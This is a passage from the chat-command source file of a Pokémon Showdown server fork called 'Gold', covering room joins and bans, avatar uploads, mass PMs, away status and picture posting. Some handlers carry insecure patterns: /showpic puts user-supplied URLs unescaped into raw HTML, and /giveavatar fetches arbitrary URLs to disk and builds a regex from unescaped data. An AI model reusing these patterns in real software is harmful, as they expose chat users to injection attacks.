					return connection.sendTo(target, "|noinit|nonexistent|The room '"+target+"' does not exist.");
				}
			}
			if (!user.named) {
				return connection.sendTo(target, "|noinit|namerequired|You must have a name in order to join the room '"+target+"'.");
			}
		}
		if (target.toLowerCase() == "shadowbanroom" && !user.can('lock')) {
			return this.sendReply("|noinit|joinfailed|The room '"+target+"' does not exist.");
		}
		if (target.toLowerCase() == "spamroom" && !user.can('hotpatch')) {
			return this.sendReply("|noinit|joinfailed|The room '"+target+"' does not exist.");
		}
		if (target.toLowerCase() == "upperstaff" && !user.can('pban')) {
			return this.sendReply("|noinit|joinfailed|Out, peasant. OUT! This room is for upper staff ONLY!");
		}
		if (target.toLowerCase() == "staff" && !user.can('warn')) {
			return this.sendReply("|noinit|joinfailed|Out, peasant. OUT! This room is for staff ONLY!");
		}
		if (target.toLowerCase() != "lobby" && !user.named) {
			return connection.sendTo(target, "|noinit|namerequired|You must have a name in order to join the room " + target + ".");
		}
		if (!user.joinRoom(targetRoom || room, connection)) {
			return connection.sendTo(target, "|noinit|joinfailed|The room '"+target+"' could not be joined.");
		}
		if (targetRoom.lockedRoom === true) {
			if ((!targetRoom.auth[user.userid]) && (!user.isStaff)) {
				return connection.sendTo(target, "|noinit|joinfailed|The room '"+target+"' is currently locked.");
			}
		}
		if (target.toLowerCase() == "lobby") {
                        return connection.sendTo('lobby','|html|<div class="broadcast-gold" border="5"><center><img src="http://media.tumblr.com/e40eb84460e150c6b8d51b49607574f5/tumblr_inline_mjrw7vcVu51qz4rgp.gif" border="5" title="Welcome to Gold!"></center><br />' +
                                        '<center><b><font size="4">Welcome to Gold!</b></font><br>' +
                                        '-<em>Stay gold, ponyboy~ :^)</em></center><br>' +
                                        '<b>1.</b> If you should have any questions or concerns while you\'re here, than please feel free to PM a server staff member, a: Driver (%), Moderator (@), Leader (&), or, if it\'s very serious, an Administrator (~).<br>' +
                                        '<b>2.</b> Do /events for a list of events that we do here!<br>' +
                                        '<b>3.</b> Advertising another server is an auto lock by PM or in chat.<br>' +
                                        '<b>4.</b> Like this server and want to help keep it running? If so, you can <a href="https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=FBZBA7MJNMG7J&lc=US&item_name=Gold%20Server&currency_code=USD&bn=PP%2dDonationsBF%3abtn_donate_LG%2egif%3aNonHosted">donate</a>!  Do /donate for more information.<br />' +
                                        '<b>5.</b> We hope you have fun while you\'re here! If so, then please be sure to tell your friends about us!<br>' +
                                        '<hr width="85%">' +
                                        '<center><a href="http://goldserver.weebly.com/rules"><button class="blackbutton" title="Rules"><font color="white"><b>Rules</b></a></button>   |   <a href="http://goldserver.weebly.com/news"><button class="blackbutton" title="News"><font color="white"><b>News</b></a></button>   |   <a href="http://goldserver.weebly.com/"><button class="blackbutton" title="Website"><font color="white"><b>Website</b></a></button>   |   <a href="http://goldserver.weebly.com/faqs"><button class="blackbutton" title="FAQs"><font color="white"><b>FAQs</b></a></button>   |   <a href="http://plug.dj/gold-server/"><button class="blackbutton" title="Plug.dj"><font color="white"><b>Plug.dj</b></a></button>   |   <button name="send" value="/shop164" class="blackbutton" title="Shop"><font color="white"><b>Shop</button></div>');
		}
		if (target.toLowerCase() == "casino") {
                        return connection.sendTo('casino','|html|<center><img src="http://i.imgur.com/n3RCajz.gif" width="100%"></center><br />' +
                                        'Gamble with friends and foes!  Use the !dice commands!<br>' +
                                        'Transfer bucks to users with /tb user, amount.<br>' +
                                        'Good luck, and have fun gambling!');
		}        
		if (target.toLowerCase() == "dawnleague") {
			return connection.sendTo('dawnleague','|html|<center><img src="http://i.imgur.com/lF3Poot.gif"><br>'+
					'Welcome to the Dawn League!<br>'+
					'--<a href="https://docs.google.com/document/m?id=1rrKS8F2xndp_tfapNWFw6sD0RrTsRzGPqoozsQp28v0">Dawn League Trainers</a><br>'+
					'<img src="http://www.serebii.net/xy/pokemon/475.png">');
		}
	},

	rb: 'roomban',
	roomban: function (target, room, user, connection) {
		if (!target) return this.parse('/help roomban');
		if (user.locked || user.mutedRooms[room.id]) return this.sendReply("You cannot do this while unable to talk.");
		if(room.id === 'lobby') {
		return this.sendReply('|html|No! Bad! Do not use this command here!');
		}
		target = this.splitTarget(target, true);
		var targetUser = this.targetUser;
		var name = this.targetUsername;
		var userid = toId(name);

		if (!userid || !targetUser) return this.sendReply("User '" + name + "' does not exist.");
		if (!this.can('ban', targetUser, room)) return false;
		if (!room.bannedUsers || !room.bannedIps) {
			return this.sendReply("Room bans are not meant to be used in room " + room.id + ".");
		}
		room.bannedUsers[userid] = true;
		for (var ip in targetUser.ips) {
			room.bannedIps[ip] = true;
		}
		targetUser.popup(user.name+" has banned you from the room " + room.id + ". To appeal the ban, PM the moderator that banned you or a room owner." + (target ? " (" + target + ")" : ""));
		this.addModCommand(""+targetUser.name+" was banned from room " + room.id + " by "+user.name+"." + (target ? " (" + target + ")" : ""));
		var alts = targetUser.getAlts();
		if (alts.length) {
			this.addModCommand(targetUser.name + "'s alts were also banned from room " + room.id + ": " + alts.join(", "));
			for (var i = 0; i < alts.length; ++i) {
				var altId = toId(alts[i]);
				this.add('|unlink|' + altId);
				room.bannedUsers[altId] = true;
			}
		}
		this.add('|unlink|' + targetUser.userid);
		targetUser.leaveRoom(room.id);
	},

	roomunban: function(target, room, user, connection) {
		if (!target) return this.parse('/help roomunban');
		if(room.id === 'lobby') {
		return this.sendReply('|html|No! Bad! Do not use this command here!');
		}
		target = this.splitTarget(target, true);
		var targetUser = this.targetUser;
		var name = this.targetUsername;
		var userid = toId(name);

		if (!userid || !targetUser) return this.sendReply("User '" + name + "' does not exist.");
		if (!this.can('ban', targetUser, room)) return false;
		if (!room.bannedUsers || !room.bannedIps) {
			return this.sendReply("Room bans are not meant to be used in room " + room.id + ".");
		}
		if (room.bannedUsers[userid]) delete room.bannedUsers[userid];
		for (var ip in targetUser.ips) {
			if (room.bannedIps[ip]) delete room.bannedIps[ip];
		}
		targetUser.popup(user.name + " has unbanned you from the room " + room.id + ".");
		this.addModCommand(targetUser.name + " was unbanned from room " + room.id + " by " + user.name + ".");
		var alts = targetUser.getAlts();
		if (alts.length) {
			this.addModCommand(targetUser.name + "'s alts were also unbanned from room " + room.id + ": " + alts.join(", "));
			for (var i = 0; i < alts.length; ++i) {
				var altId = toId(alts[i]);
				if (room.bannedUsers[altId]) delete room.bannedUsers[altId];
			}
		}
	},

	sca: 'giveavatar',
	setcustomavatar: 'giveavatar',
	setcustomavi: 'giveavatar',
	giveavatar: function(target, room, user, connection) {
        if (!this.can('giveavatar')) return this.sendReply('/giveavatar - Access denied.');
        try { 
            request = require('request');
        } catch (e) {
            return this.sendReply('/giveavatar requires the request module. Please run "npm install request" before using this command.');
        }
        if (!target) return this.sendReply('Usage: /giveavatar [username], [image] - Gives [username] the image specified as their avatar. -' +
            'Images are required to be .PNG or .GIF. Requires: & ~');
        parts = target.split(',');
        if (!parts[0] || !parts[1]) return this.sendReply('Usage: /giveavatar [username], [image] - Gives [username] the image specified as their avatar. -<br />' +
            'Images are required to be .PNG or .GIF. Requires: & ~');
        targetUser = Users.get(parts[0].trim());
        filename = parts[1].trim();
        uri = filename;
        filename = targetUser.userid + filename.slice(filename.toLowerCase().length - 4,filename.length);
        filetype = filename.slice(filename.toLowerCase().length - 4,filename.length);
        if (filetype != '.png' && filetype != '.gif') {
            return this.sendReply('/giveavatar - Invalid image format. Images are required to be in either PNG or GIF format.');
        }
        if (!targetUser) return this.sendReply('User '+target+' not found.');
        self = this;
        var download = function(uri, filename, callback) {
            request.head(uri, function(err, res, body) {
                var r = request(uri).pipe(fs.createWriteStream('config/avatars/'+filename));
                r.on('close', callback);
            });
        };
        download(uri, filename, function(err, res, body){
            if (err) return console.log('/giveavatar error: '+err);
            fs.readFile('config/avatars.csv','utf8',function(err, data) {
                if (err) return self.sendReply('/giveavatar erred: '+e.stack);
                match = false;
                var row = (''+data).split("\n");
                var line = '';
                for (var i = row.length; i > -1; i--) {
                    if (!row[i]) continue;
                    var parts = row[i].split(",");
                    if (targetUser.userid == parts[0]) {
                        match = true;
                        line = line + row[i];
                        break;
                    }
                }
                if (match === true) {
                    var re = new RegExp(line,"g");
                    var result = data.replace(re, targetUser.userid+','+filename);
                    fs.writeFile('config/avatars.csv', result, 'utf8', function (err) {
                        if (err) return console.log(err);
                    });
			for (var u in Users.customAvatars) {
				var column = Users.customAvatars[u].split(',');
				if (column[0] == targetUser.userid) {
					Users.customAvatars[u] = targetUser.userid+','+filename;
					break;
				}
			}
                } else {
                    fs.appendFile('config/avatars.csv','\n'+targetUser.userid+','+filename);
                    Users.customAvatars.push(targetUser.userid+','+filename);
                }
                self.sendReply(targetUser.name+' has received a custom avatar.');
                targetUser.avatar = filename;
                targetUser.sendTo(room, 'You have received a custom avatar from ' + user.name + '.');
                for (var u in Users.users) {
                    if (Users.users[u].group == "~" || Users.users[u].group == "&") {
                        Users.users[u].send('|pm|~Server|'+Users.users[u].group+Users.users[u].name+'|'+targetUser.name+' has received a custom avatar from '+user.name+'.');
                    }
                }
                Rooms.rooms.staff.add(targetUser.name+' has received a custom avatar from '+user.name+'.');
                if (filetype == '.gif' && targetUser.canAnimatedAvatar) targetUser.canAnimatedAvatar = false;
                if (filetype == '.png' && targetUser.canCustomAvatar) targetUser.canCustomAvatar = false;
            });
        });
	},

	masspm: 'pmall',
	pmall: function(target, room, user) {
		if (!target) return this.parse('/pmall [message] - Sends a PM to every user in a room.');
		if (!this.can('pban')) return false;

		var pmName = '~Gold Server [Do not reply]';

		for (var i in Users.users) {
			var message = '|pm|'+pmName+'|'+Users.users[i].getIdentity()+'|'+target;
			Users.users[i].send(message);
		}
	},
	
	pas: 'pmallstaff',
	pmallstaff: function(target, room, user) {
		if (!target) return this.sendReply('/pmallstaff [message] - Sends a PM to every user in a room.');
		if (!this.can('pban')) return false;
		for (var u in Users.users) { if (Users.users[u].isStaff) {
		Users.users[u].send('|pm|~Staff PM|'+Users.users[u].group+Users.users[u].name+'|'+target+' (by: '+user.name+')'); } 
		}
	},
	
	getid: 'showuserid',
	userid: 'showuserid',
	showuserid: function(target, room, user) {
		if (!target) return this.parse('/help showuserid');

		target = this.splitTarget(target);
		var targetUser = this.targetUser;

		if (!this.can('lock')) return false;

		this.sendReply('The ID of the target is: ' + targetUser);
	},
	
	gethex: 'hex',
	hex: function(target, room, user) {
		if (!this.canBroadcast()) return;
        	if (!this.canTalk()) return;
		if (user.userid === 'panpawn') {        		
			return this.sendReplyBox('Hello, <b><font color="#DA9D01">'+user.name+'</b></font>.  Your hexcode for your name color is: #DA9D01.');
        		return;
        	} else {
		return this.sendReplyBox('Hello, <b><font color="'+hashColor(''+toId(user.name)+'')+'">'+user.name+'</font></b>.  Your hexcode for your name color is: '+hashColor(''+toId(user.name)+'')+'.');
        	return;
        	}
	},
	
	away: 'afk',
	afk: function(target, room, user, connection) {
		if (!this.can('broadcast')) return false;
		if (user.name.length > 18) return this.sendReply('Your username exceeds the length limit.');
		
		if (user.userid === 'panpawn') {        		
		if (!user.isAway) {
			user.originalName = user.name;
			var awayName = user.name + ' - Ⓐⓦⓐⓨ';
			//delete the user object with the new name in case it exists - if it does it can cause issues with forceRename
			delete Users.get(awayName);
			user.forceRename(awayName, undefined, true);
		
			this.add('|raw|<b>-- <font color="#DA9D01">' + user.originalName +'</font color></b> is now away. '+ (target ? " (" + Tools.escapeHTML(target) + ")" : ""));
			user.isAway = true;
		}
		else {
			return this.sendReply('You are already set as away, type /back if you are now back.');
		}

		user.updateIdentity();	
		} else {
		if (!user.isAway) {
			user.originalName = user.name;
			var awayName = user.name + ' - Ⓐⓦⓐⓨ';
			//delete the user object with the new name in case it exists - if it does it can cause issues with forceRename
			delete Users.get(awayName);
			user.forceRename(awayName, undefined, true);
		
			this.add('|raw|<b>-- <font color="'+ hashColor(''+toId(user.originalName)+'')+'">' + user.originalName +'</font color></b> is now away. '+ (target ? " (" + Tools.escapeHTML(target) + ")" : ""));
			user.isAway = true;
		}
		else {
			return this.sendReply('You are already set as away, type /back if you are now back.');
		}

		user.updateIdentity();
		}
	},
	
	sleep: function(target, room, user, connection) {
		if (!this.can('broadcast')) return false;
		if (user.name.length > 18) return this.sendReply('Your username exceeds the length limit.');
		
		if (user.userid === 'panpawn') {        		
		if (!user.isAway) {
			user.originalName = user.name;
			var awayName = user.name + ' - Ⓢⓛⓔⓔⓟⓘⓝⓖ';
			//delete the user object with the new name in case it exists - if it does it can cause issues with forceRename
			delete Users.get(awayName);
			user.forceRename(awayName, undefined, true);
		
			this.add('|raw|<b>-- <font color="#DA9D01">' + user.originalName +'</font color></b> is now sleeping. '+ (target ? " (" + Tools.escapeHTML(target) + ")" : ""));
			user.isAway = true;
		}
		else {
			return this.sendReply('You are already set as away, type /back if you are now back.');
		}

		user.updateIdentity();	
		} else {
		if (!user.isAway) {
			user.originalName = user.name;
			var awayName = user.name + ' - Ⓢⓛⓔⓔⓟⓘⓝⓖ';
			//delete the user object with the new name in case it exists - if it does it can cause issues with forceRename
			delete Users.get(awayName);
			user.forceRename(awayName, undefined, true);
		
			this.add('|raw|<b>-- <font color="'+ hashColor(''+toId(user.originalName)+'')+'">' + user.originalName +'</font color></b> is now sleeping. '+ (target ? " (" + Tools.escapeHTML(target) + ")" : ""));
			user.isAway = true;
		}
		else {
			return this.sendReply('You are already set as away, type /back if you are now back.');
		}

		user.updateIdentity();
		}
	},
	
	busy: function(target, room, user, connection) {
		if (!this.can('broadcast')) return false;
		if (user.name.length > 18) return this.sendReply('Your username exceeds the length limit.');
		
		if (user.userid === 'panpawn') {        		
		if (!user.isAway) {
			user.originalName = user.name;
			var awayName = user.name + ' - Ⓑⓤⓢⓨ';
			//delete the user object with the new name in case it exists - if it does it can cause issues with forceRename
			delete Users.get(awayName);
			user.forceRename(awayName, undefined, true);
		
			this.add('|raw|<b>-- <font color="#DA9D01">' + user.originalName +'</font color></b> is now busy. '+ (target ? " (" + Tools.escapeHTML(target) + ")" : ""));
			user.isAway = true;
		}
		else {
			return this.sendReply('You are already set as away, type /back if you are now back.');
		}

		user.updateIdentity();	
		} else {
		if (!user.isAway) {
			user.originalName = user.name;
			var awayName = user.name + ' - Ⓑⓤⓢⓨ';
			//delete the user object with the new name in case it exists - if it does it can cause issues with forceRename
			delete Users.get(awayName);
			user.forceRename(awayName, undefined, true);
		
			this.add('|raw|<b>-- <font color="'+ hashColor(''+toId(user.originalName)+'')+'">' + user.originalName +'</font color></b> is now busy. '+ (target ? " (" + Tools.escapeHTML(target) + ")" : ""));
			user.isAway = true;
		}
		else {
			return this.sendReply('You are already set as away, type /back if you are now back.');
		}

		user.updateIdentity();
		}
	},
	
	busy: function(target, room, user, connection) {
		if (!this.can('broadcast')) return false;
		if (user.name.length > 18) return this.sendReply('Your username exceeds the length limit.');
		
		if (user.userid === 'panpawn') {        		
		if (!user.isAway) {
			user.originalName = user.name;
			var awayName = user.name + ' - Ⓑⓤⓢⓨ';
			//delete the user object with the new name in case it exists - if it does it can cause issues with forceRename
			delete Users.get(awayName);
			user.forceRename(awayName, undefined, true);
		
			this.add('|raw|<b>-- <font color="#DA9D01">' + user.originalName +'</font color></b> is now busy. '+ (target ? " (" + Tools.escapeHTML(target) + ")" : ""));
			user.isAway = true;
		}
		else {
			return this.sendReply('You are already set as away, type /back if you are now back.');
		}

		user.updateIdentity();	
		} else {
		if (!user.isAway) {
			user.originalName = user.name;
			var awayName = user.name + ' - Ⓑⓤⓢⓨ';
			//delete the user object with the new name in case it exists - if it does it can cause issues with forceRename
			delete Users.get(awayName);
			user.forceRename(awayName, undefined, true);
		
			this.add('|raw|<b>-- <font color="'+ hashColor(''+toId(user.originalName)+'')+'">' + user.originalName +'</font color></b> is now busy. '+ (target ? " (" + Tools.escapeHTML(target) + ")" : ""));
			user.isAway = true;
		}
		else {
			return this.sendReply('You are already set as away, type /back if you are now back.');
		}

		user.updateIdentity();
		}
	},
	
	back: function(target, room, user, connection) {
		if (!this.can('broadcast')) return false;
		
		if (user.userid === 'panpawn') {  
		
		if (user.isAway) {
			if (user.name === user.originalName) {
				user.isAway = false; 
				return this.sendReply('Your name has been left unaltered and no longer marked as away.');

			}

			var newName = user.originalName;

			//delete the user object with the new name in case it exists - if it does it can cause issues with forceRename
			delete Users.get(newName);
			user.forceRename(newName, undefined, true);

			//user will be authenticated
			user.authenticated = true;

			this.add('|raw|<b>-- <font color="#DA9D01">' + newName + '</font color></b> is no longer away.');
			user.originalName = '';
			user.isAway = false;
		}
		else {
			return this.sendReply('You are not set as away.');
		}

		user.updateIdentity();
		}
		if (user.isAway) {
			if (user.name === user.originalName) {
				user.isAway = false; 
				return this.sendReply('Your name has been left unaltered and no longer marked as away.');

			}

			var newName = user.originalName;

			//delete the user object with the new name in case it exists - if it does it can cause issues with forceRename
			delete Users.get(newName);
			user.forceRename(newName, undefined, true);

			//user will be authenticated
			user.authenticated = true;

			this.add('|raw|<b>-- <font color="'+ hashColor(''+toId(user.name)+'')+'">' + newName + '</font color></b> is no longer away');
			user.originalName = '';
			user.isAway = false;
		}
		else {
			return this.sendReply('You are not set as away.');
		}

		user.updateIdentity();
	},
	
	roomauth: function(target, room, user, connection) {
		if (!room.auth) return this.sendReply("/roomauth - This room isn't designed for per-room moderation and therefore has no auth list.");
		var buffer = [];
		var owners = [];
		var admins = [];
		var leaders = [];
		var mods = [];
		var drivers = [];
		var voices = [];

		room.owners = ''; room.admins = ''; room.leaders = ''; room.mods = ''; room.drivers = ''; room.voices = ''; 
		for (var u in room.auth) { 
			if (room.auth[u] == '#') { 
				room.owners = room.owners +u+',';
			} 
			if (room.auth[u] == '~') { 
				room.admins = room.admins +u+',';
			} 
			if (room.auth[u] == '&') { 
				room.leaders = room.leaders +u+',';
			}
			if (room.auth[u] == '@') { 
				room.mods = room.mods +u+',';
			} 
			if (room.auth[u] == '%') { 
				room.drivers = room.drivers +u+',';
			} 
			if (room.auth[u] == '+') { 
				room.voices = room.voices +u+',';
			} 
		}

		if (!room.founder) founder = '';
		if (room.founder) founder = room.founder;

		room.owners = room.owners.split(',');
		room.mods = room.mods.split(',');
		room.drivers = room.drivers.split(',');
		room.voices = room.voices.split(',');

		for (var u in room.owners) {
			if (room.owners[u] != '') owners.push(room.owners[u]);
		}
		for (var u in room.mods) {
			if (room.mods[u] != '') mods.push(room.mods[u]);
		}
		for (var u in room.drivers) {
			if (room.drivers[u] != '') drivers.push(room.drivers[u]);
		}
		for (var u in room.voices) {
			if (room.voices[u] != '') voices.push(room.voices[u]);
		}
		if (owners.length > 0) {
			owners = owners.join(', ');
		} 
		if (mods.length > 0) {
			mods = mods.join(', ');
		}
		if (drivers.length > 0) {
			drivers = drivers.join(', ');
		}
		if (voices.length > 0) {
			voices = voices.join(', ');
		}
		connection.popup('Room Auth in "'+room.id+'"\n\n**Founder**: \n'+founder+'\n**Owner(s)**: \n'+owners+'\n**Moderator(s)**: \n'+mods+'\n**Driver(s)**: \n'+drivers+'\n**Voice(s)**: \n'+voices);
	},

	leave: 'part',
	part: function(target, room, user, connection) {
		if (room.id === 'global') return false;
		var targetRoom = Rooms.get(target);
		if (target && !targetRoom) {
			return this.sendReply("The room '"+target+"' does not exist.");
		}
		user.leaveRoom(targetRoom || room, connection);
	},

	poof: 'd',
	d: function(target, room, user){
		if(room.id !== 'lobby') return false;
		var btags = '<strong><font color='+hashColor(Math.random().toString())+'" >';
		var etags = '</font></strong>'
		var targetid = toId(user);
		if(!user.muted && target){
			var tar = toId(target);
			var targetUser = Users.get(tar);
			if(user.can('poof', targetUser)){

				if(!targetUser){
					user.emit('console', 'Cannot find user ' + target + '.', socket);
				}else{
					if(poofeh)
						Rooms.rooms.lobby.addRaw(btags + '~~ '+targetUser.name+' was slaughtered by ' + user.name +'! ~~' + etags);
					targetUser.disconnectAll();
					return	this.logModCommand(targetUser.name+ ' was poofed by ' + user.name);
				}

			} else {
				return this.sendReply('/poof target - Access denied.');
			}
		}
		if(poofeh && !user.muted && !user.locked){
			Rooms.rooms.lobby.addRaw(btags + getRandMessage(user)+ etags);
			user.disconnectAll();
		}else{
			return this.sendReply('poof is currently disabled.');
		}
	},

	poofoff: 'nopoof',
	nopoof: function(target, room, user){
		if(!user.can('warn'))
			return this.sendReply('/nopoof - Access denied.');
		if(!poofeh)
			return this.sendReply('poof is currently disabled.');
		poofeh = false;
		return this.sendReply('poof is now disabled.');
	},

	poofon: function(target, room, user){
		if(!user.can('warn'))
			return this.sendReply('/poofon - Access denied.');
		if(poofeh)
			return this.sendReply('poof is currently enabled.');
		poofeh = true;
		return this.sendReply('poof is now enabled.');
	},

	cpoof: function(target, room, user){
		if(!user.can('broadcast'))
			return this.sendReply('/cpoof - Access Denied');

		if(poofeh)
		{
			if(target.indexOf('<img') != -1)
				return this.sendReply('Images are no longer supported in cpoof.');
			target = htmlfix(target);
			var btags = '<strong><font color="'+hashColor(Math.random().toString())+'" >';
			var etags = '</font></strong>'
			Rooms.rooms.lobby.addRaw(btags + '~~ '+user.name+' '+target+'! ~~' + etags);
			this.logModCommand(user.name + ' used a custom poof message: \n "'+target+'"');
			user.disconnectAll();
		}else{
			return this.sendReply('Poof is currently disabled.');
		}
	},
/*/
	setstatus: 'status',
	status: function(target, room, user){
		if (!target) return this.sendReply('|raw|Set your status for profile. Usage: /status <i>status information</i>');
		if (target.length > 30) return this.sendReply('Status is too long.');
		if (target.indexOf(',') >= 1) return this.sendReply('Unforunately, your status cannot contain a comma.');
		var escapeHTML = sanitize(target, true);
		io.stdoutString('status.csv', user, 'status', escapeHTML);
		
		var currentdate = new Date(); 
		var datetime = "Last Updated: " + (currentdate.getMonth()+1) + "/"+currentdate.getDate() + "/" + currentdate.getFullYear() + " @ "  + Utilities.formatAMPM(currentdate);
		io.stdoutString('statusTime.csv', user, 'statusTime', datetime);
	
		this.sendReply('Your status is now: "' + target + '"');
		if('%@&~'.indexOf(user.group) >= 0) {
			room.add('|raw|<b> * <font color="' + Utilities.hashColor(user.name) + '">' + user.name + '</font> set their status to: </b>"' + escapeHTML + '"');
		}
	},
/*
	alist: function(target, room, user){
		if(!user.can('makeroom')) return;
		target = tour.splint(target);
		if (target[0].toLowerCase() === 'list') {
			var aListStr = '';
			for (var u in aList) {
				if(aList[u] != undefined)
					aListStr += aList[u] + ', ';
			}
			aListStr = aListStr.substring(0, aListStr.length-2);
			return this.sendReply("Users currently in the list of adults: " + aListStr);
		}
		if(Object.size(target) < 2){
			return this.sendReply('Insufficient parameters.');
		}
		var tarUser = Users.get(target[1]);
		if(tarUser === undefined){
			return this.sendReply('User not found.');
		}
		if (target[0].toLowerCase() === 'add') {
			var size = Object.size(aList);
			aList[size] = tarUser.userid
			return this.sendReply(tarUser.name + ' has been added to the aList.');
		}
		if (target[0].toLowerCase() === 'remove') {
			var index = aList.indexOf(tarUser.userid);
			if(index === -1){
				return this.sendReply('User not found on aList.');
			} else {
				for (var room in Rooms.rooms) {
					if (Rooms.rooms[room].isAdult) {
							tarUser.leaveRoom(room);
					};
				};
				delete aList[index];
				tarUser.sendTo('lobby', 'You have been removed from the alist and all adult rooms. If you feel this was unjustified, please contact an administrator.');
				return this.sendReply(tarUser.name + ' has been removed from the aList.');
			}
		} else {
			return this.sendReply("Unknown command. Allowable commands are: list, add, remove.");
		}
	},
*/
	showpic: function(target, room, user) {
		if (!target) return this.sendReply('/showpic [url], [size] - Adds a picture to the room. Size of 100 is the width of the room (100%).');

		if (!this.canTalk()) return;
		if (!this.can('mute', null, room)) return;

		if (!room.isPrivate || !room.auth) return this.sendReply('You can only do this in unofficial private rooms.');
		target = tour.splint(target);
		var picSize = '';
		if (target[1]) {
			if (target[1] < 1 || target[1] > 100) return this.sendReply('Size must be between 1 and 100.');
			picSize = ' height=' + target[1] + '% width=' + target[1]+ '%';
		}
		this.add('|raw|<div class="broadcast-blue"><img src=' + target[0] + picSize + '></div>');
		this.logModCommand(user.name +' added the image ' + target[0]);
	},
    /*
	id: 'profile',
	profile: function(target, room, user) {
		if (user.locked) return this.sendReply('You cannot use this command while locked.');
		
		var targetUser = this.targetUserOrSelf(target);
		var avatar = user.avatar;
		var badges = user.badges;
		var reg = (!targetUser.authenticated);
		
		
		var username = target;
		target = target.replace(/\s+/g, '');
		var util = require("util"),
    	http = require("http");

		var options = {
    		host: "www.pokemonshowdown.com",
    		port: 80,
    		path: "/forum/~"+target
		};

		var content = "";   
		var self = this;
		var req = http.request(options, function(res) {
			
		    res.setEncoding("utf8");
		    res.on("data", function (chunk) {
	        content += chunk;
    		});
	    	res.on("end", function () {
			content = content.split("<em");
			if (content[1]) {
				content = content[1].split("</p>");
				if (content[0]) {
					content = content[0].split("</em>");
					if (content[1]) {
						regdate = content[1];
					}
				}
			}
			else {
				regdate = username+' is not registered.';
			}
		    });
		});
		req.end();
		if (config.groups[targetUser.group] && config.groups[targetUser.group].name) {
			var group = ''+ config.groups[targetUser.group].name + ' (' + targetUser.group + ')';
		} else {
			var group = 'Regular User';
		}
		
		if (!this.canBroadcast()) return;
		this.sendReplyBox('<center><font size="2" face="comic sans ms">Gold Profile</center></font><br>'+
		'<img src="http://192.168.1.146/avatars/'+targetUser+'.gif" align="left" height="80" target="_blank"><b>User:</b> '+targetUser+'<br>'+
		'<b>Group:</b> '+group+'<br>'+
		'<b>Registered:</b> '+regdate+'<br>'+
		'--<i>Courtesy of Gold!</i>');
		if (!targetUser) {
			return this.sendReply('User '+targetUser+' not found.');
		}
	},*/
	
	tell: function(target, room, user) {
		if (!this.canTalk()) return;
		if (!target) return this.parse('/help tell');
		var commaIndex = target.indexOf(',');
		if (commaIndex < 0) return this.sendReply('You forgot the comma.');
		var targetUser = toId(target.slice(0, commaIndex));
		var message = target.slice(commaIndex + 1).trim();
		if (message.replace(/(<([^>]+)>)/ig,"").length > 600) return this.sendReply('tells must be 600 or fewer characters, excluding HTML.');
		message = htmlfix(message);
		if (targetUser.length > 18) {
			return this.sendReply('The name of user "' + targetUser + '" is too long.');
		}

		if (!tells[targetUser]) tells[targetUser] = [];
		if (tells[targetUser].length === 8) return this.sendReply('User ' + targetUser + ' has too many tells queued.');

		var date = Date();
		var messageToSend = '|raw|' + date.slice(0, date.indexOf('GMT') - 1) + ' - <b>' + user.getIdentity() + '</b> said: ' + message;
		tells[targetUser].add(messageToSend);

		return this.sendReply('Message "' + message + '" sent to ' + targetUser + '.');
	},
/*	
	impersonate:'imp',
	imp: function(target, room, user) {
		if (!user.can('broadcast')) return this.sendReply('/imp - Access denied.');
		if (!this.canTalk()) return;
		if (!target) return this.parse('/help imp');
		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser || !targetUser.connected) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if(!target)
			return this.sendReply('You cannot make the user say nothing.');
		if(target.indexOf('/announce') == 0 || target.indexOf('/warn') == 0 || target.indexOf('/data')==0)
			return this.sendReply('You cannot use this to make a user announce/data/warn in imp.');
		room.add('|c|'+targetUser.getIdentity()+'|'+ target + ' ``**(imp by '+ user.getIdentity() + ')**``');
		
	},
*/
	/*
	punt: function (target, room, user) {
		if (!target) return this.sendReply('You must select a user to punt.\n/punt [user] - punts the selected user.');
		if (!this.canBroadcast()) return false;
		if (!this.broadcasting) return this.sendReply('This command can only be used by broadcasting it.');
		var targetUser = Users.get(target);

		if (!targetUser) return this.sendReply('User "' + target.trim() + '" could not be found.');

		room.add('|c|' + user.getIdentity() + '|/me punts ' + targetUser.name);
		return room.add('|c|' + targetUser.getIdentity() + '|/me is punted by ' + user.name);
	},

	kupkup: function(target, room, user){
		if(!user.can('root')) return this.sendReply('/kupkup - Access denied.');
		for(var i = 0; i < 5; i++)
			for(var u in room.users)
				if(Users.get(u) != undefined && u.toLowerCase().indexOf('guest') != 0 && Users.get(u).connected)
					this.add('|c|' + Users.get(u).getIdentity() + '|THE KUPKUP CHANT: Ã¢â„¢Âªkupo kupo kupochu~Ã¢â„¢Â«');
		return;
	},
	*/

	/*********************************************************
	 * Reminders
	 *********************************************************/
/*
	reminders: 'reminder',
	reminder: function (target, room, user) {
		if (!target) return this.parse('/help reminder');
		if (room.type !== 'chat') return this.sendReply('This command can only be used in chatrooms.');

		if (!room.reminders) room.reminders = room.chatRoomData.reminders = {};

		if (target.trim().toLowerCase() === 'view' || target.trim().toLowerCase() === 'display') {
			if (!this.canBroadcast()) return;
			var message = '<strong><font size=3>Reminders for '+room.title+':</strong></font>'+(room.reminders[1]?'<ol>':'<br /><br />There are no reminders to display. ');
			if (room.reminders[1]) {
				for (var r in room.reminders) {
					message += htmlfix('<li>'+room.reminders[r]);
				}
				message += '</ol>';
			}
			message += 'Contact a room owner, leader, or admin if you have a reminder you would like added.';
			return this.sendReplyBox(message);
		}

		if (target.trim().toLowerCase() === 'clear') {
			if (!this.can('declare', null, room)) return;
			if (!room.canClearRems) room.canClearRems = {};
			if (!(user.userid in room.canClearRems)) {
				room.canClearRems[user.userid] = 1;
				return this.sendReply('WARNING: this command will clear all reminders for '+room.title+'. Type "/reminder clear" if you are certain.');
			} else {
				for (var i in room.reminders) delete room.reminders[i];
				delete room.canClearRems;
				Rooms.global.writeChatRoomData();
				return this.sendReply('All reminders for '+room.title+' have been deleted.');
			}
		}

		var commaIndex = target.indexOf(',');
		if (commaIndex === -1) {
			this.sendReply('You forgot the comma.');
			return this.parse('/help reminder');
		}
		if (!(target.slice(0, commaIndex).toLowerCase() in {'add':1,'delete':1})) {
			this.sendReply('Unknown command.');
			return this.parse('/help reminder');
		}
		if (!this.can('declare', null, room)) return;

		var command = target.slice(0, commaIndex).trim().toLowerCase();
		target = target.slice(commaIndex + 1).trim();
		if (command === 'add') {
			if (target.indexOf('<cat') !== -1) return this.sendReply('Cats are not supported in reminders.');
